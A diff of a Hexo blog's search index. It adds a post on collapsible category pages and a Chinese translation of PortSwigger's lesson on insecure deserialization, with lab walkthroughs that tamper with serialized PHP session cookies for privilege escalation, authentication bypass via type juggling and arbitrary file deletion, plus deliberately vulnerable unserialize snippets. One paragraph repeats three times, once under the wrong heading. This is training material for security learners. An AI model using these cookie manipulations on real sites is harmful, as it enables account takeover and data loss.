@@ -357,6 +357,43 @@ $$</p>
       </tags>
   </entry>
   <entry>
+    <title></title>
+    <url>/posts/0/</url>
+    <content><![CDATA[<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+  </entry>
+  <entry>
+    <title>【Hexo】分类页面展开折叠</title>
+    <url>/posts/15e23f74/</url>
+    <content><![CDATA[<ul class="lvl-0">
+<li class="lvl-2">
+<p>原来的分类页面太丑了，并且分类之间看的不是很清楚。于是我就想优化一下，添加新的样式。</p>
+</li>
+<li class="lvl-2">
+<p>添加好了以后，我又觉得如果后期文章增多，页面就会非常杂乱，因此我又优化成了可以展开折叠的页面。</p>
+</li>
+<li class="lvl-2">
+<p>优化成可以展开折叠的页面之后，看到最后一层分类的时候总感觉空荡荡的，总觉得到这样了，不如把所有的文章都直接显示出来得了。</p>
+</li>
+</ul>
+<p>于是便有了这篇文章。</p>
+<h2 id="分类折叠功能">分类折叠功能</h2>
+<p>在themes\next\layout\page.swig中，找到分类页面，替换成下面的代码：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% elif page.type === &#x27;categories&#x27; %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;category-all-page&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;category-all-title&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123; _p(&#x27;counter.categories&#x27;, site.categories.length) &#125;&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;category-all&quot;</span> <span class="attr">id</span>=<span class="string">&quot;categoryContainer&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123; list_categories() &#125;&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我的自定义CSS样式在source_data\styles.styl中，在你的自定义样式中添加：</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 分类折叠样式 */</span></span><br><span class="line"><span class="selector-class">.category-toggle-icon</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">16px</span>;</span><br><span class="line">  <span class="attribute">margin-right</span>: <span class="number">5px</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.category-list-child</span> &#123;</span><br><span class="line">  <span class="attribute">padding-left</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.category-list-link</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">padding-left</span>: <span class="number">0</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 添加手型光标表示可点击 */</span></span><br><span class="line"><span class="selector-class">.category-list-item</span> &gt; <span class="selector-class">.category-list-link</span> &#123;</span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 悬停效果 */</span></span><br><span class="line"><span class="selector-class">.category-list-item</span> &gt; <span class="selector-class">.category-list-link</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#f5f5f5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>创建js文件themes\next\source\js\category-collapse.js：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> container = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;categoryContainer&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!container) <span class="keyword">return</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 1. 添加折叠图标</span></span><br><span class="line">  container.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.category-list-item&#x27;</span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> childList = item.<span class="title function_">querySelector</span>(<span class="string">&#x27;ul&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (childList) &#123;</span><br><span class="line">      <span class="keyword">const</span> header = item.<span class="title function_">querySelector</span>(<span class="string">&#x27;.category-list-link&#x27;</span>).<span class="property">parentNode</span>;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 创建折叠图标</span></span><br><span class="line">      <span class="keyword">const</span> icon = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;i&#x27;</span>);</span><br><span class="line">      icon.<span class="property">className</span> = <span class="string">&#x27;fa fa-caret-right category-toggle-icon&#x27;</span>;</span><br><span class="line">      header.<span class="title function_">insertBefore</span>(icon, header.<span class="property">firstChild</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 添加点击事件处理</span></span><br><span class="line">      header.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.<span class="property">target</span>.<span class="property">tagName</span> === <span class="string">&#x27;A&#x27;</span>) &#123;</span><br><span class="line">          e.<span class="title function_">preventDefault</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">const</span> isExpanded = childList.<span class="property">style</span>.<span class="property">display</span> !== <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">        childList.<span class="property">style</span>.<span class="property">display</span> = isExpanded ? <span class="string">&#x27;none&#x27;</span> : <span class="string">&#x27;block&#x27;</span>;</span><br><span class="line">        icon.<span class="property">classList</span>.<span class="title function_">toggle</span>(<span class="string">&#x27;fa-caret-right&#x27;</span>, !isExpanded);</span><br><span class="line">        icon.<span class="property">classList</span>.<span class="title function_">toggle</span>(<span class="string">&#x27;fa-caret-down&#x27;</span>, isExpanded);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 2. 初始隐藏所有子分类</span></span><br><span class="line">  container.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.category-list-item ul&#x27;</span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">ul</span> =&gt;</span> &#123;</span><br><span class="line">    ul.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>记得在themes\next\layout_layout.swig中的<code>&lt;body&gt;</code>前引用：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;&#123; partial(&#x27;_scripts/noscript.swig&#x27;, &#123;&#125;, &#123;cache: theme.cache.enable&#125;) &#125;&#125;</span><br><span class="line">&#123;% if page.type === &#x27;categories&#x27; %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/js/category-collapse.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125; </span><br></pre></td></tr></table></figure>
+<p>没错就这么简单。剩下的可以优化一下CSS。</p>
+<h2 id="文章折叠展开">文章折叠展开</h2>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>Hexo</category>
+        <category>Hexo</category>
+      </categories>
+  </entry>
+  <entry>
     <title>【弱口令】弱口令总结</title>
     <url>/posts/960078f8/</url>
     <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Wrong password, please try again.Or you can contact the author to view the blog" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
@@ -404,7 +441,6 @@ $$</p>
 <p><img src="/posts/60f39975//image-20250723143513850.png" alt="image-20250723143513850"></p>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
       <categories>
-        <category>Hexo</category>
         <category>Hexo</category>
       </categories>
   </entry>
@@ -4407,7 +4443,7 @@ nday 扫框架 组件漏洞未授权 弱口令逻辑漏洞短信轰炸（看能�
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
       <categories>
         <category>渗透测试</category>
-        <category>注入漏洞</category>
+        <category>SQL注入</category>
       </categories>
   </entry>
   <entry>
@@ -4717,6 +4753,312 @@ nday 扫框架 组件漏洞未授权 弱口令逻辑漏洞短信轰炸（看能�
       </tags>
   </entry>
   <entry>
+    <title>【PortSwigger靶场】反序列化</title>
+    <url>/posts/bea7d250/</url>
+    <content><![CDATA[<h2 id="不安全的反序列化">不安全的反序列化</h2>
+<p>在本节中，我们将介绍什么是不安全的反序列化，并描述不安全的反序列化如何可能使网站遭受严重攻击。我们将重点介绍典型场景，并使用 PHP、Ruby 和 Java 反序列化的具体示例演示一些广泛适用的技术。我们还将介绍一些可以避免自己的网站出现不安全反序列化漏洞的方法。</p>
+<h2 id="什么是序列化？">什么是序列化？</h2>
+<p>序列化是将复杂的数据结构（如对象及其字段）转换为 “flatter” 格式的过程，这种格式可以作为连续的字节流发送和接收。数据序列化使以下工作变得更加简单：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>将复杂数据写入进程间内存、文件或数据库</p>
+</li>
+<li class="lvl-2">
+<p>通过网络、应用程序不同组件之间或 API 调用等方式发送复杂数据</p>
+</li>
+</ul>
+<p>最重要的是，在序列化对象时，其状态也会被持久化。换句话说，对象的属性及其赋值都会被保留下来。</p>
+<h3 id="序列化与反序列化">序列化与反序列化</h3>
+<p>反序列化是将字节流还原为原始对象的全功能复制品的过程，其状态与序列化时完全相同。然后，网站的逻辑就可以与这个反序列化对象交互，就像与其他对象交互一样。</p>
+<p>许多编程语言都为序列化提供本地支持。具体如何序列化对象取决于语言。有些语言将对象序列化为二进制格式，而其他语言则使用不同的字符串格式，其可读性也各不相同。请注意，原始对象的所有属性都会存储在序列化数据流中，包括任何私有字段。要防止某个字段被序列化，必须在类声明中将其明确标记为 “transient” 字段。</p>
+<p>请注意，在使用不同的编程语言时，序列化可能被称为 marshalling（Ruby）或 pickling（Python）。这些术语在此处与 “serialization” 同义。</p>
+<h2 id="什么是不安全的反序列化？">什么是不安全的反序列化？</h2>
+<p>不安全的反序列化是指网站对用户可控数据进行反序列化。这有可能使攻击者操纵序列化对象，从而将有害数据传递到应用程序代码中。</p>
+<p>甚至有可能将序列化后的对象替换为完全不同类的对象。令人担忧的是，网站可用的任何类的对象都会被反序列化和实例化，而不管预期的是哪个类。因此，不安全的反序列化有时被称为 “对象注入 ”漏洞。</p>
+<p>一个意外类的对象可能会导致异常。不过，此时破坏可能已经造成。许多基于反序列化的攻击都是在反序列化完成之前完成的。这意味着，即使网站本身的功能不直接与恶意对象交互，反序列化过程本身也可能发起攻击。因此，逻辑基于强类型语言的网站也容易受到这些技术的攻击。</p>
+<h2 id="不安全的反序列化漏洞是如何产生的？">不安全的反序列化漏洞是如何产生的？</h2>
+<p>不安全的反序列化通常是因为人们普遍缺乏对反序列化用户可控数据的危险性的认识。理想情况下，用户输入根本不应该被反序列化。</p>
+<p>不过，有时网站所有者会认为自己很安全，因为他们对反序列化数据实施了某种形式的额外检查。这种方法往往是无效的，因为几乎不可能实施验证或消毒来应对每一种可能发生的情况。这些检查从根本上说也是有缺陷的，因为它们依赖于在数据被反序列化后对其进行检查，而在许多情况下，这已经太晚了，无法阻止攻击。</p>
+<p>由于通常认为反序列化对象是可信的，因此也可能出现漏洞。特别是在使用二进制序列化格式的语言时，开发人员可能会认为用户无法有效地读取或操作数据。然而，虽然可能需要付出更多努力，但攻击者利用二进制序列化对象的可能性与利用基于字符串格式的对象的可能性一样大。</p>
+<p>现代网站中存在大量依赖关系，这也使得基于反序列化的攻击成为可能。一个典型的网站可能实现了许多不同的库，每个库都有自己的依赖关系。这就形成了一个庞大的类和方法池，很难对其进行安全管理。由于攻击者可以创建任何这些类的实例，因此很难预测在恶意数据上可以调用哪些方法。如果攻击者能够将一长串意想不到的方法调用串联起来，将数据传递到与初始源完全无关的汇中，情况就更是如此。因此，要预测恶意数据流并堵住每个潜在漏洞几乎是不可能的。</p>
+<p>简而言之，可以说不可能安全地反序列化不受信任的输入。</p>
+<h2 id="不安全的反序列化会产生什么影响？">不安全的反序列化会产生什么影响？</h2>
+<p>不安全的反序列化可能会造成非常严重的影响，因为它为大量增加的攻击面提供了一个切入点。它允许攻击者以有害的方式重复使用现有的应用程序代码，导致许多其他漏洞，通常是远程代码执行。</p>
+<p>即使在不可能执行远程代码的情况下，不安全的反序列化也会导致权限升级、任意文件访问和拒绝服务攻击。</p>
+<h2 id="如何利用不安全的反序列化漏洞">如何利用不安全的反序列化漏洞</h2>
+<p>现在您已经熟悉了序列化和反序列化的基础知识，我们可以看看如何利用不安全的反序列化漏洞。</p>
+<h2 id="利用不安全的反序列化漏洞">利用不安全的反序列化漏洞</h2>
+<p>在本节中，我们将以 PHP、Ruby 和 Java 反序列化为例，教您如何利用一些常见情况。我们希望展示利用不安全的反序列化实际上比许多人想象的要容易得多。如果您能够使用预构建的小工具链，甚至在黑盒测试中可以做到这一点。</p>
+<p>我们还将指导您创建自己的基于反序列化的高严重性攻击。虽然这些攻击通常需要源代码访问权限，但一旦理解了基本概念，学习起来也会比想象中容易。我们将特别介绍以下主题：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>如何识别不安全的反序列化 LABS</p>
+</li>
+<li class="lvl-2">
+<p>修改网站期望的序列化对象 LABS</p>
+</li>
+<li class="lvl-2">
+<p>向危险的网站功能传递恶意数据 LABS</p>
+</li>
+<li class="lvl-2">
+<p>注入任意对象类型</p>
+</li>
+<li class="lvl-2">
+<p>串联方法调用以控制进入危险水槽小工具的数据流 LABS</p>
+</li>
+<li class="lvl-2">
+<p>手动创建自己的高级漏洞利用程序 LABS</p>
+</li>
+<li class="lvl-2">
+<p>PHAR 反序列化</p>
+</li>
+</ul>
+<blockquote>
+<p><strong>Note</strong></p>
+<p>尽管许多实验和示例都基于 PHP，但大多数开发技术对其他语言也同样适用。</p>
+</blockquote>
+<h3 id="如何识别不安全的反序列化">如何识别不安全的反序列化</h3>
+<p>不管是白盒测试还是黑盒测试，识别不安全的反序列化都相对简单。</p>
+<p>在审计过程中，你应该查看所有传入网站的数据，并尝试识别任何看起来像序列化数据的东西。如果了解不同语言使用的格式，序列化数据就能比较容易地识别出来。在本节中，我们将展示 PHP 和 Java 序列化的示例。一旦识别出序列化数据，就可以测试是否能够控制它。</p>
+<blockquote>
+<p><strong>Tip</strong></p>
+<p>对于 Burp Suite Professional 的用户，Burp Scanner 会自动标记任何看起来包含序列化对象的 HTTP 消息。</p>
+</blockquote>
+<h3 id="PHP-序列化格式">PHP 序列化格式</h3>
+<p>PHP 使用的大多是人类可读的字符串格式，字母代表数据类型，数字代表每个条目的长度。例如，用户对象的属性为</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span>-&gt;name = <span class="string">&quot;carlos&quot;</span>;</span><br><span class="line"><span class="variable">$user</span>-&gt;isLoggedIn = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
+<p>序列化后，该对象的外观可能如下所示：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>:s:<span class="number">6</span>:<span class="string">&quot;carlos&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;isLoggedIn&quot;</span>:b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>这可以解释为：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p><code>O:4: &quot;User&quot;</code> - 具有 4 个字符类名 <code>&quot;User&quot;</code> 的对象</p>
+</li>
+<li class="lvl-2">
+<p><code>2</code> - 该对象有 2 个属性</p>
+</li>
+<li class="lvl-2">
+<p><code>s:4: &quot;name&quot;</code> - 第一个属性的键是 4 个字符的字符串 <code>“name”</code>。</p>
+</li>
+<li class="lvl-2">
+<p><code>s:6: &quot;carlos&quot;</code> - 第一个属性的值是 6 个字符的字符串 <code>“carlos”</code>。</p>
+</li>
+<li class="lvl-2">
+<p><code>s:10: &quot;isLoggedIn&quot;</code> - 第二个属性的键是 10 个字符的字符串 “isLoggedIn”。</p>
+</li>
+<li class="lvl-2">
+<p><code>b:1</code> - 第二个属性的值是布尔值 <code>true</code></p>
+</li>
+</ul>
+<p>PHP 序列化的本地方法是 <code>serialize() </code>和 <code>unserialize()</code>。如果可以访问源代码，就应该先在代码中查找 <code>unserialize()</code>，然后进一步研究。</p>
+<h3 id="Java-序列化格式">Java 序列化格式</h3>
+<p>有些语言（如 Java）使用二进制序列化格式。这种格式更难读取，但如果知道如何识别一些蛛丝马迹，还是可以识别序列化数据的。例如，序列化的 Java 对象总是以相同的字节开始，在十六进制中编码为 <code>aced</code>，在 Base64 中编码为 <code>rO0</code>。</p>
+<p>任何实现了 <code>java.io.Serializable</code> 接口的类都可以被序列化和反序列化。如果您可以访问源代码，请注意任何使用 <code>readObject()</code> 方法的代码，该方法用于从 <code>InputStream</code> 中读取和反序列化数据。</p>
+<h3 id="操作序列化对象">操作序列化对象</h3>
+<p>利用某些反序列化漏洞就像更改序列化对象中的一个属性一样简单。由于对象状态是持久化的，因此可以通过研究序列化数据来识别和编辑有趣的属性值。然后，您就可以通过网站的反序列化过程将恶意对象传入网站。这是基本反序列化漏洞利用的第一步。</p>
+<p>一般来说，在操作序列化对象时有两种方法。一种是直接编辑字节流形式的对象，另一种是用相应的语言编写简短的脚本，自己创建新对象并将其序列化。在处理二进制序列化格式时，后一种方法通常更为简便。</p>
+<h4 id="修改对象属性">修改对象属性</h4>
+<p>在篡改数据时，只要攻击者保留了一个有效的序列化对象，反序列化过程就会创建一个带有修改后属性值的服务器端对象。</p>
+<p>举个简单的例子，一个网站使用序列化的 <code>User</code> 对象在 cookie 中存储用户会话数据。如果攻击者在 HTTP 请求中发现了这个序列化对象，他们可能会对其进行解码，发现以下字节流：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;carlos&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;isAdmin&quot;</span>;b:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p><code>isAdmin</code> 属性是一个明显的关注点。攻击者只需将该属性的布尔值改为 <code>1</code>（true），重新编码对象，然后用修改后的值覆盖当前 cookie 即可。单独来看，这不会产生任何影响。但是，假设网站使用此 cookie 来检查当前用户是否有访问某些管理功能的权限：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$user</span>-&gt;isAdmin === <span class="literal">true</span>) &#123;</span><br><span class="line"><span class="comment">// allow access to admin interface</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这段有漏洞的代码会根据 cookie 中的数据（包括攻击者修改过的 <code>isAdmin</code> 属性）实例化一个<code>User</code>对象。在任何时候都不会检查序列化对象的真实性。然后，这些数据会被传递到条件语句中，在这种情况下，就可以轻松实现权限升级。</p>
+<p>这种简单的情况在实际应用中并不常见。不过，以这种方式编辑属性值，展示了获取不安全反序列化所暴露的大量攻击面的第一步。</p>
+<h4 id="Lab：修改序列化对象">Lab：修改序列化对象</h4>
+<p>本实验使用了基于序列化的会话机制，因此存在权限升级漏洞。要解决该实验问题，请编辑会话 cookie 中的序列化对象，利用此漏洞获得管理权限。然后删除用户 carlos。</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>使用自己的凭据登录。请注意，登录后的 <code>GET /my-account</code> 请求包含一个会话 cookie，它似乎是 URL 和 Base64 编码的。</p>
+</li>
+<li class="lvl-2">
+<p>使用 Burp 的 Inspector 面板研究请求的解码形式。请注意，cookie 实际上是一个序列化的 PHP 对象。admin 属性包含 b:0，表示布尔值 false。将此请求发送到 Burp Repeater。</p>
+</li>
+<li class="lvl-2">
+<p>在 Burp Repeater 中，使用检查器再次检查 cookie，并将 admin 属性的值更改为 b:1。点击 “应用更改”。修改后的对象将自动重新编码并更新到请求中。</p>
+</li>
+<li class="lvl-2">
+<p>发送请求。请注意，响应中现在包含了一个指向 /admin 管理面板的链接，表明您已使用管理员权限访问了该页面。</p>
+</li>
+<li class="lvl-2">
+<p>将请求路径改为 /admin，然后重新发送。注意 /admin 页面包含删除特定用户账户的链接。</p>
+</li>
+<li class="lvl-2">
+<p>将请求路径更改为 /admin/delete?username=carlos，然后发送请求以解决实验室问题。</p>
+</li>
+</ul>
+<h4 id="修改数据类型">修改数据类型</h4>
+<p>我们已经看到了如何修改序列化对象中的属性值，但也有可能提供意想不到的数据类型。</p>
+<p>由于在比较不同数据类型时使用了松散比较运算符 (==)，基于 PHP 的逻辑特别容易受到这种操作的影响。例如，如果在整数和字符串之间进行松散比较，PHP 会尝试将字符串转换为整数，这意味着 5 == “5” 的值为 true。</p>
+<h2 id="如何防止不安全的反序列化漏洞">如何防止不安全的反序列化漏洞</h2>
+<p>一般来说，除非绝对必要，否则应避免对用户输入进行反序列化。在许多情况下，反序列化可能带来的高严重性漏洞，以及防范这些漏洞的难度，都超过了反序列化的好处。</p>
+<p>由于在比较不同数据类型时使用了松散比较运算符 (==)，基于 PHP 的逻辑特别容易受到这种操作的影响。例如，如果在整数和字符串之间进行松散比较，PHP 会尝试将字符串转换为整数，这意味着 5 == “5” 的值为 true。</p>
+<p>由于在比较不同数据类型时使用了松散比较运算符 (<code>==</code>)，基于 PHP 的逻辑特别容易受到这种操作的影响。例如，如果在整数和字符串之间进行松散比较，PHP 会尝试将字符串转换为整数，这意味着 <code>5 == “5”</code> 的值为 <code>true</code>。</p>
+<p>不同寻常的是，这也适用于任何以数字开头的字母数字字符串。在这种情况下，PHP 将根据开头的数字有效地将整个字符串转换为整数值。字符串的其余部分将被完全忽略。因此，<code>5 == &quot;5 of something&quot;</code> 实际上被视为 <code>5 == 5</code>。</p>
+<p>同样，在 PHP 7.x 及更早版本中，比较 <code>0 == &quot;Example string&quot;</code> 的结果为 <code>true</code>，因为 PHP 将整个字符串视为整数 <code>0</code>。</p>
+<p>考虑将这种松散的比较运算符与来自反序列化对象的用户可控数据结合使用的情况。这有可能导致危险的逻辑缺陷。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$login</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>)</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$login</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$password</span>) &#123;</span><br><span class="line"><span class="comment">// log in successfully</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>假设攻击者修改了密码属性，使其包含整数 <code>0</code>，而不是预期的字符串。只要存储的密码不是以数字开头，该条件就会始终返回 <code>true</code>，从而实现身份验证绕过。请注意，这只是因为反序列化保留了数据类型。如果代码直接从请求中获取密码，<code>0</code> 将被转换为字符串，条件将返回 <code>false</code>。</p>
+<blockquote>
+<p><strong>Note</strong></p>
+<p>在 PHP 8 及以后的版本中，0 == “Example string ”比较结果为 false，因为在比较过程中字符串不再隐式转换为 0。因此，在这些版本的 PHP 中无法使用此漏洞。</p>
+<p>比较以数字开头的字母数字字符串的行为在 PHP 8 中保持不变。因此，5 == <code>“5 of something ”</code>仍被视为 <code>5 == 5</code>。</p>
+</blockquote>
+<p>请注意，在修改任何序列化对象格式中的数据类型时，一定要记得更新序列化数据中的任何类型标签和长度指示符。否则，序列化对象将被损坏，无法进行反序列化。</p>
+<h4 id="Lab：-修改序列化数据类型">Lab： 修改序列化数据类型</h4>
+<p>本实验使用了基于序列化的会话机制，因此容易发生身份验证绕过。要解决该实验问题，请编辑会话 cookie 中的序列化对象，以访问<code>administrator</code>账户。然后删除用户 <code>carlos</code>。</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>使用自己的凭据登录。在 Burp 中，打开登录后的 <code>GET /my-account</code> 请求，并使用检查器检查会话 cookie，以显示序列化的 PHP 对象。将此请求发送到 Burp Repeater。</p>
+</li>
+<li class="lvl-2">
+<p>在 Burp Repeater 中，使用检查器面板对会话 cookie 进行如下修改：</p>
+<ul class="lvl-2">
+<li class="lvl-4">
+<p>将用户名属性的长度更新为 13。</p>
+</li>
+<li class="lvl-4">
+<p>将用户名改为管理员。</p>
+</li>
+<li class="lvl-4">
+<p>将访问令牌更改为整数 0。 由于这不再是字符串，因此还需要删除值周围的双引号。</p>
+</li>
+<li class="lvl-4">
+<p>将 s 替换为 i，更新访问令牌的数据类型标签。</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>结果应该是这样的:</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;administrator&quot;</span>;s:<span class="number">12</span>:<span class="string">&quot;access_token&quot;</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>单击 “应用更改”。修改后的对象将自动重新编码并更新到请求中。</p>
+</li>
+<li class="lvl-2">
+<p>发送请求。请注意，响应中现在包含一个指向 <code>/admin</code> 管理面板的链接，表明您已成功以管理员用户身份访问该页面。</p>
+</li>
+<li class="lvl-2">
+<p>将请求路径改为 <code>/admin</code>，然后重新发送。注意<code> /admin</code> 页面包含删除特定用户账户的链接。</p>
+</li>
+<li class="lvl-2">
+<p>将请求路径更改为<code> /admin/delete?username=carlos</code>，然后发送请求以解决实验室问题。</p>
+</li>
+</ul>
+<p>在直接处理二进制格式时，我们建议使用 BApp 商店提供的 Hackvertor 扩展。使用 Hackvertor，你可以将序列化数据修改为字符串，它会自动更新二进制数据，并相应调整偏移量。这样可以节省大量的手动操作。</p>
+<h2 id="使用应用程序功能">使用应用程序功能</h2>
+<p>除了简单地检查属性值外，网站功能还可能对来自反序列化对象的数据执行危险操作。在这种情况下，您可以利用不安全的反序列化传递非预期数据，并利用相关功能进行破坏。</p>
+<p>例如，作为网站 “删除用户 ”功能的一部分，用户的个人资料图片是通过访问 <code>$user-&gt;image_location</code> 属性中的文件路径来删除的。如果该 <code>$user</code> 是通过序列化对象创建的，攻击者就可以通过将 <code>image_location</code> 设置为任意文件路径的修改后传入来利用这一漏洞。删除自己的用户账户后，也会删除这个任意文件。</p>
+<h4 id="Lab：-使用应用程序功能利用不安全的反序列化">Lab： 使用应用程序功能利用不安全的反序列化</h4>
+<p>本实验室使用基于序列化的会话机制。某个功能会对序列化对象中提供的数据调用一个危险的方法。要解决这个实验问题，请编辑会话 cookie 中的序列化对象，并用它删除<code>Carlos</code>主目录中的 <code>morale.txt</code> 文件。</p>
+<ol>
+<li class="lvl-3">
+<p>登录自己的账户。在 “我的账户 ”页面，注意到有删除账户的选项，可向 /my-account/delete 发送 POST 请求。</p>
+</li>
+<li class="lvl-3">
+<p>向 Burp Repeater 发送包含会话 cookie 的请求。</p>
+</li>
+<li class="lvl-3">
+<p>在 Burp Repeater 中，使用检查器面板研究会话 cookie。注意到序列化对象有一个 avatar_link 属性，其中包含头像的文件路径。</p>
+</li>
+<li class="lvl-3">
+<p>编辑序列化数据，使 avatar_link 指向 /home/carlos/morale.txt。记住要更新长度指示符。修改后的属性应如下所示：</p>
+</li>
+</ol>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">s</span>:<span class="number">11</span>:<span class="string">&quot;avatar_link&quot;</span>;s:<span class="number">23</span>:<span class="string">&quot;/home/carlos/morale.txt&quot;</span></span><br></pre></td></tr></table></figure>
+<ol start="5">
+<li class="lvl-3">
+<p>点击 “应用更改”。修改后的对象将自动重新编码并更新到请求中。</p>
+</li>
+<li class="lvl-3">
+<p>将请求行改为 POST /my-account/delete 并发送请求。您的账户将被删除，同时删除的还有卡洛斯的 morale.txt 文件。</p>
+</li>
+</ol>
+<p>这个示例依赖于攻击者通过用户可访问的功能手动调用危险方法。但是，如果利用漏洞自动将数据传递到危险方法中，不安全的反序列化就会变得更加有趣。使用 “magic methods ”可以实现这一点。</p>
+<h2 id="Magic-methods">Magic methods</h2>
+<p>魔法方法是无需显式调用的方法的特殊子集。相反，每当发生特定事件或情况时，它们就会被自动调用。魔法方法是各种语言中面向对象编程的常见特征。有时会在方法名称的前缀或周围加上双引号来表示它们。</p>
